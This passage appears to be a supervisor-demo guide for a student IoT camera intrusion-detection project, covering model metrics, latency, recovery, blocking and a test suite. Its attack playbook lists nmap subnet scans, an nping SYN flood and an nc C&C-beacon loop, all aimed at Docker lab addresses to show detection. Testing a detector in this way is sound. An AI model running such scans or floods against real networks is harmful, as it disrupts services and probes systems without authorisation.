print('Benign predicted attack   :', '{:.2f}%'.format(m['level_2_benign_fpr_argmax'] * 100), '(IoT-23 benign flows of 34-1)')
"
```
- Only single quotes inside the Python code, and `'...'.format(...)` instead of f-strings with double quotes (PowerShell 5.1 breaks inner double quotes).

#### 📋 Real Output:
```text
=== TABLE 9 CLASSIFICATION TARGET (saved in the model bundle) ===
Model                     : iot_camera_ids_bundle v3.1.0
Held-out scenario         : CTU-IoT-Malware-Capture-34-1 (23,145 flows)
Macro-F1, classes present : 85.95% (target >= 85%)
Macro-F1, all 5 classes   : 68.76% (34-1 has no Malware_Download flows)
Accuracy / weighted F1    : 93.22% / 93.67%
Grouped CV out-of-fold F1 : 70.97% (22 training scenarios)
Benign predicted attack   : 5.62% (IoT-23 benign flows of 34-1)
```

#### 📊 Output Breakdown:
- `Macro-F1, classes present 85.95%`: the H1 number (decision D-054: 34-1 has only 4 of the 5 classes).
- `Macro-F1, all 5 classes 68.76%`: with an empty Malware_Download class, this number can be at most 80%.
- `Accuracy 93.22%`: high partly because DDoS flows are 62% of 34-1; this is why macro-F1 is the main measure (proposal 3.4).
- `Grouped CV out-of-fold 70.97%`: the score over the 22 training scenarios, each left out once.
- `Benign predicted attack 5.62%`: on IoT-23 benign flows (not camera traffic); not the H1 measure.
- Per class on 34-1 (model card): DDoS_DoS F1 0.995, CnC 0.876, PortScan 0.846, Benign 0.721.

##### 🔬 Honest warning (say it):
**34-1 is not a clean test any more.** It was opened in Step 16 for v1 and v2, used in the PC demonstrations, and studied (progress entry 3.71) before the D-052 changes. The clean test is the lab (Steps 20 and 35). Also: on the same rows, HistGradientBoosting scored higher out-of-fold than the Random Forest (0.7391 vs 0.7097, issue 49); the Random Forest stays the main model as in the proposal.

#### 🗣️ Spoken Script:
> *"Sir, on the held-out scenario 34-1, model v3.1.0 reaches a macro-F1 of 0.8595 over the classes present, which meets our 0.85 target, and 0.6876 over all five classes, because 34-1 has no download flows. I must add that 34-1 is no longer a clean test: we opened and studied it during development. So we treat this as a good sign, and the hardware lab test as the real check."*

---

### Target 2: Benign Safety (No Disruption of Camera Operation)

#### 💡 Why:
A camera security system must never stop the recording or block the management PC or NVR. Table 9 also needs benign FPR ≤ 5% **on our local camera traffic**.

#### ⚙️ Under the hood:
1. The NVR log shows each recorded 5-minute segment.
2. A TCP connection from the NVR to camera port 554 shows the stream service is open.
3. The router sets show that no protected device is blocked.

#### 💻 Commands:
```powershell
# 1. NVR recording log (one line per 5-minute segment):
docker logs ids-lab-nvr --tail 3

# 2. Open a connection from the NVR to the camera stream port:
docker exec ids-lab-nvr python -c "import socket; s=socket.create_connection(('192.168.50.30', 554), timeout=3); print('NVR -> camera:554 connection OK')"

# 3. No protected device in any drop set:
docker exec ids-lab-router nft list table inet ids | Select-String "elements"
```

#### 📋 Real Output (13 Nov 2026):
```text
07:19:44 NVR: recorded 58.5 MB
07:24:44 NVR: recorded 58.6 MB
07:29:44 NVR: recorded 58.6 MB
NVR -> camera:554 connection OK
		elements = { 192.168.50.1, 192.168.50.5,
```
(The only `elements` line is the allowlist; the drop sets are empty.)

#### 📊 Output Breakdown:
- `NVR: recorded 58.6 MB` every 5 minutes (about 1.56 Mbit/s): the stream kept going, also during the attack tests (entry 3.78).
- `connection OK`: the camera's stream port answers.
- Background run: about 6 hours of normal traffic gave no alert for the camera, NVR or admin PC (entry 3.78).

##### 🔬 What it does not prove:
The **benign FPR ≤ 5% on local camera traffic** (H1 part 2) is **not measured**. The camera is a simulator, so the number must come from a real camera capture (Step 20) in the hardware lab.

#### 🗣️ Spoken Script:
> *"Sir, for benign safety: in every test, the camera, NVR and admin PC were never blocked, and the NVR kept recording 58.6 MB every five minutes, also during the attacks. About six hours of normal traffic gave no alert on them. The false-positive rate on real camera traffic, which is the second part of H1, will be measured with the real camera in the hardware lab."*

---

### Target 3: Decision Latency (Median < 2 s, 95% < 5 s)

#### 💡 Why:
Table 9 and RQ4: the decision must be fast enough to act during an attack.

#### Different times (do not mix them):
| Time | What it measures | Value |
| :--- | :--- | :--- |
| **Model step** | One `predict_proba` call | about 31 ms for one flow; about 0.04–0.07 ms per flow in a batch |
| **System time** (Table 9 measure) | Zeek line read → features → model → decision → database → dashboard push | median 0.141 s, 95% 0.636 s (Step 37 report); 152 / 620 ms live now |
| **Flow end → dashboard** | Includes Zeek's wait before it writes a flow | median 5.9 s, 95% 301 s in the Step 37 run: a long connection (for example the 5-minute video stream) is written only when it ends |
| **First alert → rule active** | Alert → router rule | median 0.159 s, max 0.273 s (Step 37 report) |

#### 🧪 Method 1: Model Step Time (one hand-made C&C-like flow)

⚙️ **Under the hood:** builds one flow with the 27 features by hand (a failed TCP try with many failed tries before it, `pair_fail_1h = 588`), runs the deployed model once to warm up, then times one call with `time.perf_counter()`.

```powershell
.venv\Scripts\python.exe -c "
import time, joblib, pandas as pd
b = joblib.load('ml_engine/models/ids_bundle_v3.joblib')
model, classes = b['calibrated_model'], b['class_names']
flow = {'proto':'tcp','service':'unknown','conn_state':'S0','history':'S','orig_port_cat':'registered','resp_port_cat':'dynamic','duration':3.14,'orig_bytes':0.0,'resp_bytes':0.0,'missed_bytes':0.0,'orig_pkts':3.0,'orig_ip_bytes':180.0,'resp_pkts':0.0,'resp_ip_bytes':0.0,'orig_bytes_per_pkt':0.0,'resp_bytes_per_pkt':0.0,'byte_ratio':0.0,'pkt_ratio':1.0,'is_incomplete_flow':1,'src_conn_60s':1.0,'src_udst_60s':1.0,'src_uport_60s':1.0,'src_udst_ratio':1.0,'pair_conn_60s':1.0,'pair_gap':3.82,'pair_gap_change':3.36,'pair_fail_1h':588.0}
one = pd.DataFrame([flow])
model.predict_proba(one)
t0 = time.perf_counter(); pr = model.predict_proba(one)[0]; t1 = time.perf_counter()
print('=== MODEL STEP TIME (one hand-made C&C-like flow) ===')
print('Predicted class / confidence :', classes[pr.argmax()], '{:.2f}%'.format(pr.max() * 100))
print('Time for 1 flow             : {:.1f} ms'.format((t1 - t0) * 1000))
batch = pd.DataFrame([flow] * 1000)
t0 = time.perf_counter(); model.predict_proba(batch); t1 = time.perf_counter()
print('Time for 1,000 flows        : {:.1f} ms = {:,.0f} flows per second'.format((t1 - t0) * 1000, 1000 / (t1 - t0)))
print('Saved training benchmark    : {:.2f} us per flow ({:,.0f} flows/s, measured in Step 14)'.format(b['metadata']['inference_latency_us_flow'], b['metadata']['inference_throughput_fps']))
"
```
- `b['calibrated_model']`: the model the live detector uses (in v3.1.0 it gives the raw Random Forest probabilities; Step 17a chose "no calibration").

##### 📋 Real Output:
```text
=== MODEL STEP TIME (one hand-made C&C-like flow) ===
Predicted class / confidence : CnC 98.89%
Time for 1 flow             : 31.1 ms
Time for 1,000 flows        : 42.7 ms = 23,416 flows per second
Saved training benchmark    : 7.96 us per flow (125,599 flows/s, measured in Step 14)
```

##### 📊 Output Breakdown:
- `CnC 98.89%`: the model's answer **for this hand-made flow** (not a live alert).
- `31.1 ms for 1 flow`: most of this is fixed overhead of one call (pandas, 100 trees); it is the same for 1 flow or 100.
- `23,416 flows per second` for a batch: the live adapter sends flows in batches. This number depends on how busy the PC is (another run the same day: 70.9 ms = 14,108 flows per second).
- `7.96 µs / 125,599 flows/s`: the Step 14 benchmark saved in the bundle, measured differently during training. It does **not** match this command's result, so do not quote it as the live speed.

#### 🧪 Method 2: Live System Time (Table 9 measure)
Use the FR-04 command; it prints the live median and 95th percentile. The full Step 37 measurement is `reports/performance/virtual/performance_virtual-attack_20261111_044533.md` (made by `tools/measure_latency.py`, with a logged-in Socket.IO client receiving the pushes).

##### 📋 Step 37 report (virtual lab, 11 Nov 2026, 540 s with attacks):
```text
| B. Read -> decision                 | median 0.125 s | 95% 0.629 s |
| C. Decision -> dashboard            | median 0.004 s | 95% 0.025 s |
| D. Read -> dashboard (system part)  | median 0.141 s | 95% 0.636 s |
| E. Flow end -> dashboard            | median 5.921 s | 95% 301.156 s |
| F. First alert -> rule active       | median 0.159 s | max 0.273 s |
- Proposal target (median decision < 2 s, 95th percentile < 5 s) on D: met (median 0.141 s, 95th 0.636 s)
```

#### 🖥️ Dashboard:
**Overview → SYSTEM STATUS (MEASURED):** "Time per flow, Zeek line to dashboard (median / 95%)".

#### 🗣️ Spoken Script:
> *"Sir, for Target 3 we separate the times. The model itself needs about 31 milliseconds for one call. The system time from reading Zeek's line to the dashboard push, which is the Table 9 measure, had a median of 0.14 seconds and a 95th percentile of 0.64 seconds in our Step 37 run, inside the 2 and 5 second targets. From the first alert to the router rule took about 0.16 seconds. Zeek itself writes a connection only when it ends, so a long connection appears later; we report that wait separately and do not hide it."*

---

### Target 4: Throughput & Resource Use

#### 💡 Why:
During a flood, thousands of flows arrive. The system must keep up and not lose important events.

#### 📋 What we measured:
- **Model capacity:** about 14,000–23,000 flows per second in a batch (Target 3, Method 1; depends on PC load).
- **Lab load:** the Step 37 run had a peak of **500 flows per second**, and 19,024 flows in total. The backend used at most 78.5% of one CPU and 128 MB of memory.
- **No attack lost:** every attack test (2.2–2.5) raised alerts; Zeek's `stats.log` shows 0 packets dropped.
- **No data lost by Zeek:** `capture_loss.log` shows 0.0% since the snap-length fix (D-058).

#### 💻 Command (capture loss and dropped packets, last 3 minutes):
```powershell
Get-Content lab_virtual\zeek_logs\capture_loss.log -Tail 3
Get-Content lab_virtual\zeek_logs\stats.log -Tail 1 | Select-String -Pattern '"pkts_dropped":[0-9]*' | ForEach-Object { $_.Matches[0].Value }
```

#### 📋 Real Output (13 Nov 2026, after the fix):
```text
{"ts":1794560834.425324,"ts_delta":60.02673101425171,"peer":"zeek","gaps":0,"acks":691,"percent_lost":0.0}
{"ts":1794560894.514549,"ts_delta":60.08922505378723,"peer":"zeek","gaps":0,"acks":815,"percent_lost":0.0}
{"ts":1794560954.516937,"ts_delta":60.00238800048828,"peer":"zeek","gaps":0,"acks":626,"percent_lost":0.0}
"pkts_dropped":0
```

#### 🔧 What was wrong before (D-058, fixed 13 Nov 2026):
Zeek keeps only the first 9,216 bytes of each packet by default. The Docker network joins many small packets into large ones (up to 64 KB, "offloading"), so Zeek cut off the rest. Result: `capture_loss.log` about 98%, the NVR stream about 58.5 MB of `missed_bytes` per 5-minute segment, and only part of the test download seen. `sensor/local.zeek` now sets `redef Pcap::snaplen = 65535;`. After the fix the NVR flow shows `"missed_bytes":0`.

#### 🗣️ Spoken Script:
> *"Sir, the model can classify roughly 14 to 23 thousand flows per second, while our virtual lab's peak was 500 flows per second, and every attack was detected. Zeek reports zero dropped packets and zero capture loss. Earlier today it showed high capture loss; we found that Zeek was cutting the large joined packets of the virtual network, fixed the snap length, and measured again."*

---

### Target 5: Reliability & Clean State Recovery

#### 💡 Why:
After a restart, the system must come back to the same safe state: the same blocks on the router, nothing lost, nothing extra.

#### ⚙️ Under the hood:
1. The IDS reaches the router with the same SSH command the router adapter uses (key `router_admin`, the lab's own `known_hosts`, `StrictHostKeyChecking=yes`).
2. `GET /api/v1/firewall/sync` compares the database blocks with the router rules and shows the expiry worker.
3. **Restart test:** add a test block, stop the backend, wipe the router set (as if the router lost its rules), start the backend: the startup recovery must put the rule back.

#### 💻 Command A — router SSH and sync state:
```powershell
ssh -p 2222 -i lab_virtual\keys\router_admin -o IdentitiesOnly=yes -o BatchMode=yes -o UserKnownHostsFile=lab_virtual\keys\known_hosts -o StrictHostKeyChecking=yes root@127.0.0.1 "nft list table inet ids" | Select-String "table inet|set "
.venv\Scripts\python.exe -c "
import urllib.request, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
s = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/v1/firewall/sync', headers={'Authorization':'Bearer '+tok})).read())
print('Database and router agree   :', s['in_sync'], '(router rules', str(s['firewall_rules_count']) + ', database active blocks', str(s['db_active_blocks_count']) + ')')
print('Rule expiry worker running  :', s['worker'].get('running'), '| every', s['worker'].get('interval_seconds'), 's')
"
```
- The project does not use the `paramiko` package (it is not installed); the router adapter calls the Windows `ssh` command, as here.

#### 📋 Real Output:
```text
table inet ids {
	set allow {
	set block_src {
	set block_dst {
	set limit_src {
Database and router agree   : True (router rules 0, database active blocks 0)
Rule expiry worker running  : True | every 10 s
```

#### 💻 Command B — restart recovery test (test address 10.10.10.99):
```powershell
# 1. Block the test address for 10 minutes (Target 6 block command, or the ENFORCE BLOCK form on /mitigations)
# 2. Stop the backend and wipe the router set, as if the router lost its rules:
.venv\Scripts\python.exe lab_virtual\lab.py ids-stop
docker exec ids-lab-router nft flush set inet ids block_src
docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
# 3. Start the backend again and look at the router:
.venv\Scripts\python.exe lab_virtual\lab.py ids-start
docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
```

#### 📋 Real Output (13 Nov 2026):
```text
IDS backend stopped
(after the flush: no elements line = the router set is empty)
IDS backend running (pid ...), database iot_ids_lab; pipeline start: 200 running
		elements = { 10.10.10.99 timeout 10m expires 9m59s232ms }
```
Audit record written by the recovery: `STARTUP_RULE_RESTORED SUCCESS {"action": "block", "direction": "source", "ip": "10.10.10.99", "remaining_minutes": 10}`. Then remove the test block (Target 6 unblock).

#### 📊 Output Breakdown:
- The router lost the rule while the backend was down; at start-up the backend found the active block in MongoDB and put it back on the router with the remaining time (rounded up to whole minutes).
- A rate-limit is restored as a rate-limit, never as a full block (D-056). Rules that ended while the backend was down are marked `expired`.

##### 🔬 What is not tested yet:
Router reboot, sensor power loss and network cable tests (Step 38). The hardware kit has `lab_hardware/hwlab.py reliability restart|expiry` for this.

#### 🗣️ Spoken Script:
> *"Sir, for reliability, we stopped the backend, wiped the block from the router, and started the backend again. The startup recovery found the active block in the database and put it back on the router, and wrote this in the audit log. Router reboot and power-loss tests are planned in Step 38 in the hardware lab."*

---

### Target 6: Usability & Audit (Manual Control)

#### 💡 Why:
The admin must always be able to block or unblock by hand, and every action must be traceable.

#### ⚙️ Under the hood:
1. `POST /api/blocklist` (admin only) blocks test address `10.10.10.99` for 10 minutes; the router adapter adds it to `block_src`; MongoDB saves it; a `MANUAL_BLOCK` audit record is written.
2. `DELETE /api/blocklist/10.10.10.99` removes it from the router and marks the record `removed` (the history is kept); a `MANUAL_UNBLOCK` audit record is written.

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist', data=json.dumps({'ip':'10.10.10.99','direction':'source','duration_minutes':10,'reason':'Usability test block'}).encode(), headers=H))
print('Manual block   :', r.getcode(), json.loads(r.read())['message'])
"
docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
.venv\Scripts\python.exe -c "
import urllib.request, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist/10.10.10.99', data=json.dumps({'reason':'Usability test rollback'}).encode(), headers=H, method='DELETE'))
print('Manual unblock :', r.getcode(), json.loads(r.read())['message'])
for ev in ('MANUAL_BLOCK', 'MANUAL_UNBLOCK'):
    l = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/logs?limit=1&event=' + ev, headers=H)).read())['logs'][0]
    print('Audit record   :', l['timestamp'][:19], l['event'], l['actor'], l['outcome'], l['details'].get('ip'), '-', l['details'].get('reason'))
"
docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
```

#### 📋 Real Output (13 Nov 2026):
```text
Manual block   : 201 Blocking rule for '10.10.10.99' enacted successfully.
		elements = { 10.10.10.99 timeout 10m expires 9m59s876ms }
Manual unblock : 200 Unblocked '10.10.10.99'. 1 rule(s) transitioned to 'removed'.
Audit record   : 2026-11-13T07:55:56 MANUAL_BLOCK labadmin SUCCESS 10.10.10.99 - Usability test block
Audit record   : 2026-11-13T07:55:56 MANUAL_UNBLOCK labadmin SUCCESS 10.10.10.99 - Usability test rollback
```
(The last router command prints nothing: the set is empty again.)

#### 📊 Output Breakdown:
- `201` / `200`: block created, then removed.
- The router line shows the block really reached the kernel, with a 10-minute timer.
- The two audit records show who did what, when, to which address, and why.
- If the firewall fails, the API answers `502 FIREWALL_ERROR` and nothing is saved as blocked.

##### 🔬 Not done yet:
The formal usability test with set admin tasks (Step 39, `docs/usability_tasks.md`).

#### 🖥️ Dashboard:
**Blocklist (`/mitigations`):** use the **ENFORCE BLOCK** form for `10.10.10.99`, show the row with **EXPIRES AT**, press **UNBLOCK**; then show the `MANUAL_BLOCK` / `MANUAL_UNBLOCK` records on **Logs & Export**. **Never use the camera address for this.**

#### 🗣️ Spoken Script:
> *"Sir, the admin always keeps control: a manual block reaches the router kernel at once, the unblock removes it at once, and both actions are in the audit log with the user, the address and the reason. The formal usability test with set tasks is Step 39."*

---

# 4. Part 3: Research Objectives (O1 to O6)

Section 3 of [`docs/requirements_checklist.md`](docs/requirements_checklist.md):

1. **O1 — Repeatable IoT-23 preprocessing and label mapping: Done.** All 23 scenarios (325.3 million flows) checked against the official files (`reports/iot23_copy_verification.md`), SHA-256 manifest, frozen label mapping (`config/label_mapping.yaml`), data-quality report. Training sample: 1,182,984 flows from 22 scenarios (variant WCD).
2. **O2 — Multi-class Random Forest with no scenario leakage: Done (method).** Grouped cross-validation by scenario (out-of-fold macro-F1 0.7097) and a left-out scenario (34-1: 0.8595 classes present, 0.6876 all 5). 34-1 is not a clean test any more.
3. **O3 — Live features that match the dataset: Shown in the virtual lab.** Same 27 columns, types and ranges on live Zeek flows (format PASS); 14 of 27 features shifted. Final answer on real camera traffic (Steps 19, 20, 22).
4. **O4 — Monitoring, dashboard, storage and alerts joined: Built and working.** Zeek → adapter → model → decision engine → MongoDB → Socket.IO dashboard, on real packets (FR-01 to FR-04, Step 36 report).
5. **O5 — Policy-based IP blocking with manual undo: Built and shown.** Automatic C&C destination block, DDoS rate-limit, manual block/unblock, expiry, startup recovery (FR-02, FR-06, Targets 5–6). Hardware-lab test pending.
6. **O6 — Detection quality, speed and resource use: Partly.** Offline quality and virtual-lab speed are measured; FPR on real camera traffic and resource use on the real sensor need the hardware lab (Steps 35–40).

---

# 5. Part 4: Hypothesis H1 and Research Questions RQ1 to RQ5

* **H1:** *"Macro-F1 ≥ 0.85 on held-out scenarios, while keeping the benign false-positive rate ≤ 5% on the local IP-camera traffic we control."*
  - **Part 1:** 0.8595 over the classes present on 34-1 (D-054) — meets the number, but 34-1 is not a clean test.
  - **Part 2:** **not tested yet** (needs real camera traffic, Step 20).
  - **So H1 is not confirmed yet.** The lab results will decide it.
* **RQ1 (benign vs. malicious under scenario-aware validation):** offline answer available — grouped CV out-of-fold macro-F1 0.7097 over 22 scenarios; on 34-1 accuracy 0.9322 and Benign F1 0.721 (many 34-1 "benign" flows look like failed attack tries; D-051).
* **RQ2 (sorting into DDoS, scanning, C&C, malware/download):** per-class F1, grouped out-of-fold (22 scenarios): DDoS_DoS 0.764, CnC 0.769, PortScan 0.631, Malware_Download 0.644. On 34-1: DDoS_DoS 0.995, CnC 0.876, PortScan 0.846 (no Malware_Download flows in 34-1). Most C&C *conversations* are still missed (366 of 1,640, issue 48). Program downloads are found by the file-type rule, not the model.
* **RQ3 (features available and stable in IoT-23 and live Zeek):** all 27 features are available with the same format in live Zeek output; 14 of 27 have a different distribution in the virtual lab. Final answer on real camera traffic (Step 22).
* **RQ4 (time from detection to dashboard, alert and block):** virtual lab, Step 37: Zeek line → dashboard median 0.141 s, 95% 0.636 s; first alert → router rule median 0.159 s. Plus Zeek's own wait until a flow ends (reported separately). Hardware-lab measurement pending.
* **RQ5 (safety rules so that automatic response does not stop camera access):** designed and built (`docs/response_policy.md`): allowlist, camera-LAN protection, class thresholds, 3 repeats in 60 s, 30-minute limit, audit. In every virtual-lab test the camera, NVR and admin PC were never blocked. Open: manual camera block (issue 52) and camera cloud retries that could look like C&C (issue 39). Hardware-lab evidence pending (Step 35).

---

# 6. Part 5: Automated Test Suite (314 Tests)

#### 💡 Why:
To show that each part (Zeek adapter, features, model bundle, decision engine, response policy, firewall adapters, login, Socket.IO, scanner, export) is tested automatically. Passing tests do **not** replace the lab tests.

#### ⚙️ Under the hood:
`pytest` finds the tests in `tests/unit/` and `tests/integration/` and runs them. The integration tests use their own MongoDB databases (`iot_ids_test`, `iot_ids_test_live`), not the lab database.

```powershell
.venv\Scripts\python.exe -m pytest tests/ -q
```
- `-m pytest`: run pytest from the virtual environment.
- `tests/`: all test folders.
- `-q`: short output (one dot per test).

#### 📋 Real Output (13 Nov 2026, last line):
```text
314 passed, 6 warnings in 109.89s (0:01:49)
```

#### 🗣️ Spoken Script:
> *"Sir, the code has 314 automated unit and integration tests, and all of them pass. They check each part on the PC; the lab tests are still needed for the final results."*

---

# 7. Part 6: Live Manual Attack Playbook

If the supervisor asks to see one attack end to end, use the tests of FR-02. Before each one: `.venv\Scripts\python.exe lab_virtual\lab.py reset`, and keep **Live Alerts (`/alerts`)** and **Blocklist (`/mitigations`)** open. If the attacks of FR-02 were already run in the meeting, do the fresh backend start (Section 1, step 3b) before repeating one.

### Attack 1: Port Scan (`nmap`) — FR-02 Test 2.2
```powershell
docker exec ids-lab-attacker nmap -sS -p 23,80,554 192.168.50.0/24 | Select-String "Nmap done|Nmap scan report"
```
- Show the **PortScan** cards (amber) appear without refresh, with source `10.10.10.50`.
- Explain why there is no block (needs ≥ 0.88 and 3 alerts in 60 s).
- Do **not** scan a single host (it gave a CnC alert, not PortScan).

### Attack 2: SYN Flood (`nping`) — FR-02 Test 2.3
```powershell
docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30 | Select-String "Starting|Raw packets|Nping done"
docker exec ids-lab-router nft list set inet ids limit_src
```
- Show the **DDoS_DoS** card (red) and `10.10.10.50` in `limit_src`.
- If a CnC card and a `block_src` entry also appear, say that this is open issue 43.

### Attack 3: C&C Calls and Router Block (`nc`) — FR-02 Test 2.4

#### Step 1: `block_dst` is empty before the attack, and no C&C server is running:
```powershell
docker exec ids-lab-attack-server pkill -f "lab_server.py --role cnc"
docker exec ids-lab-router nft list set inet ids block_dst
```
*(Real output: the set has no `elements` line — it is empty.)*

#### Step 2: The camera calls its C&C server every 5 seconds:
```powershell
docker exec ids-lab-camera sh -c 'for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do nc -z -w 2 10.10.10.50 6667; echo try $i exit=$?; sleep 5; done'
```

#### Step 3: The outside address is in `block_dst` with a timer:
```powershell
docker exec ids-lab-router nft list set inet ids block_dst
```
```text
		elements = { 10.10.10.50 timeout 30m expires 28m19s240ms }
```
- `10.10.10.50` (C&C server) is blocked; the camera `192.168.50.30` is not in any set, and the NVR keeps recording (`docker logs ids-lab-nvr --tail 1`).

#### 🖥️ Dashboard:
1. **Live Alerts:** **CnC** card (purple), `192.168.50.30 → 10.10.10.50:6667`, response **blocked**.
2. **Blocklist:** `10.10.10.50`, reason `AUTO_CNC_DEST_BLOCK`, **EXPIRES AT** about 30 minutes later, **UNBLOCK** button.

> 🎯 **Final Evidence for the Supervisor:**  
> *"Sir, the camera kept trying to reach an outside C&C server. Zeek recorded each try, the model classed them as C&C, and after three such alerts within a minute the policy blocked the outside address in the router kernel for 30 minutes. The camera itself was not blocked, so its video to the NVR never stopped. On 13 November this took about 25 to 30 seconds from the first try; once the policy decided, the router rule took a fraction of a second."*

#### After the playbook:
Wait 30 seconds after the last C&C try (see Test 2.4), then:
```powershell
.venv\Scripts\python.exe lab_virtual\lab.py reset
```

---

# 8. Part 7: Questions the Supervisor May Ask

| Question | Short honest answer |
| :--- | :--- |
| "Is 34-1 really unseen?" | No. It was opened and studied during development (model card section 6, D-054). The clean test is the hardware lab. |
| "Why is the confidence for DDoS only about 0.45?" | The live flood looks different from IoT-23 floods (14 shifted features). It is still the top class of the five, and the DDoS rate-limit threshold (0.30) was chosen from training data only, before the lab test. |
| "Why did the flood also cause a C&C block?" | Many failed connections from one source to one address can look like C&C (issue 43). We record it and will check it in the hardware lab. |
| "Why does a single-host scan not give PortScan?" | Too few flows for the 60-second window features (issues 38, 46). A subnet sweep gives PortScan. |
| "Why do you restart the backend before the demo?" | The window features remember the last hour of each source. After many rehearsals from the same attacker address, a scan looked like C&C (it has many earlier failed tries). This is the same weakness as issue 43; the restart starts the memory empty, like a new attacker. In the hardware lab we will record how often this happens with real traffic. |
| "Is the model calibrated?" | Step 17a compared methods by a rule written first; it chose no calibration (raw Random Forest probabilities, D-044/D-045). |
| "Is Random Forest the best model?" | On the same rows, HistGradientBoosting has a slightly higher out-of-fold macro-F1 (0.7391 vs 0.7097, issue 49). We keep Random Forest as planned in the proposal and report both. |
| "Does Zeek lose packets?" | No: `stats.log` shows 0 dropped and `capture_loss.log` 0.0%. Earlier the capture loss was about 98% because Zeek cut the large joined packets of the virtual network at 9,216 bytes; fixed with a larger snap length (D-058). We will measure again on the real sensor. |
| "Can the camera be blocked by mistake?" | Not automatically (camera-LAN protection). A manual block by an admin is accepted today (issue 52); we would like your advice: refuse it, or ask for confirmation. |
| "Could the camera's normal cloud retries look like C&C?" | Possibly (issue 39), because C&C is blocked at 0.30. We test this with a cloud outage in the hardware lab before automatic response is used there. |
| "What is still left?" | Hardware lab (Step 5), real camera capture and FPR (Step 20), Zeek on the real sensor (Steps 19, 22), the 6 scenarios, FR, speed, reliability and usability tests in the hardware lab (Steps 35–39), and the final report (Steps 40–42). |

---

### 🎓 Closing Statement:
> *"Sir, to summarise: all eight functional requirements are built and work on real packets in our virtual lab. The model meets the 0.85 macro-F1 number on the classes present in the held-out scenario, with the warning that this scenario is no longer a clean test. The system time from Zeek to the dashboard is well inside the latency target, and the camera, NVR and admin PC were never blocked in any test. The remaining step is the hardware lab with a real camera, where we will measure the benign false-positive rate, repeat the six scenarios, and test reliability and usability. That will decide our hypothesis H1."*
